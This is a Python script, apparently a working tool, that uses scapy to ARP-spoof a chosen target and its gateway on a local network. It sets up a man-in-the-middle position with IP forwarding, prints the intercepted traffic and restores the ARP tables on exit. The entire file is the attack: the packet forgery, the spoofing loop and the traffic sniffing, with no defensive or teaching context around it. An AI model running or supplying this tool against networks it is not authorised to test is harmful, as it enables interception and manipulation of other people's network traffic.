import sys
import time
import argparse
import psutil
import signal
import random
from scapy.all import ARP, Ether, srp, sendp, sniff, conf

FILE_ip_forward = "/proc/sys/net/ipv4/ip_forward"


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True, help="Target IP")
    parser.add_argument("-i", "--interface", required=True)
    parser.add_argument("--both", action="store_true", help="Enable full MITM (victim <-> gateway)")
    return parser.parse_args()


def get_interface_config(i):
    addrs = psutil.net_if_addrs().get(i, [])
    ipv4, mac = None, None

    for addr in addrs:
        if addr.family.name == 'AF_INET':
            ipv4 = addr.address
        elif addr.family.name in ('AF_PACKET', 'AF_LINK'):
            mac = addr.address

    return ipv4, mac


def get_gateway():
    return conf.route.route("0.0.0.0")[2]


def arp_request(ip, iface):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    result = srp(pkt, timeout=2, iface=iface, verbose=0)[0]

    for _, r in result:
        return r.hwsrc
    return None


def enable_ip_forward():
    try:
        with open(FILE_ip_forward, "w") as f:
            f.write("1")
    except:
        print("[!] Failed to enable IP forwarding")


def restore(victim_ip, victim_mac, gw_ip, gw_mac, iface, bidirectional):
    print("[+] Restoring network...")

    # restore victim
    sendp(Ether(dst=victim_mac) / ARP(
        op=2,
        psrc=gw_ip,
        hwsrc=gw_mac,
        pdst=victim_ip,
        hwdst=victim_mac
    ), iface=iface, count=3, verbose=0)

    # restore gateway
    if bidirectional:
        sendp(Ether(dst=gw_mac) / ARP(
            op=2,
            psrc=victim_ip,
            hwsrc=victim_mac,
            pdst=gw_ip,
            hwdst=gw_mac
        ), iface=iface, count=3, verbose=0)


def spoof_once(victim_ip, victim_mac, gw_ip, gw_mac, attacker_mac, iface, bidirectional):
    # Victime -> attaquant (spoof gateway)
    pkt1 = Ether(dst=victim_mac, src=attacker_mac) / ARP(
        op=2,
        psrc=gw_ip,
        hwsrc=attacker_mac,
        pdst=victim_ip,
        hwdst=victim_mac
    )

    print(f"[ARP reply] {gw_ip} is-at {attacker_mac} → {victim_ip}")
    sendp(pkt1, iface=iface, verbose=0)

    if bidirectional:
        # Gateway -> attacker (spoof victim)
        pkt2 = Ether(dst=gw_mac, src=attacker_mac) / ARP(
            op=2,
            psrc=victim_ip,
            hwsrc=attacker_mac,
            pdst=gw_ip,
            hwdst=gw_mac
        )

        print(f"[ARP reply] {victim_ip} is-at {attacker_mac} → {gw_ip}")
        sendp(pkt2, iface=iface, verbose=0)


def packet_callback(pkt):
    if pkt.haslayer("IP"):
        print(f"[TRAFFIC] {pkt['IP'].src} -> {pkt['IP'].dst}")


def main():
    args = parse_args()

    victim_ip = args.target
    iface = args.interface
    bidirectional = args.both

    attacker_ip, attacker_mac = get_interface_config(iface)

    if not attacker_ip or not attacker_mac:
        sys.exit("[!] Could not get interface config")

    gw_ip = get_gateway()

    print(f"[+] Victim: {victim_ip}")
    print(f"[+] Gateway: {gw_ip}")
    print(f"[+] Mode: {'MITM' if bidirectional else 'Unidirectional'}")

    victim_mac = arp_request(victim_ip, iface)
    gw_mac = arp_request(gw_ip, iface)

    if not victim_mac or not gw_mac:
        sys.exit("[!] Failed to resolve MAC addresses")

    print(f"[+] Victim MAC: {victim_mac}")
    print(f"[+] Gateway MAC: {gw_mac}")

    if bidirectional:
        enable_ip_forward()

    def cleanup(signum=None, frame=None):
        restore(victim_ip, victim_mac, gw_ip, gw_mac, iface, bidirectional)
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)

    print("[+] Attack started...\n")

    sniff(prn=packet_callback, iface=iface, store=0, filter="ip", timeout=0, count=0)

    try:
        while True:
            spoof_once(victim_ip, victim_mac, gw_ip, gw_mac, attacker_mac, iface, bidirectional)
            time.sleep(random.uniform(1, 2))

    finally:
        cleanup()


if __name__ == "__main__":
    main()
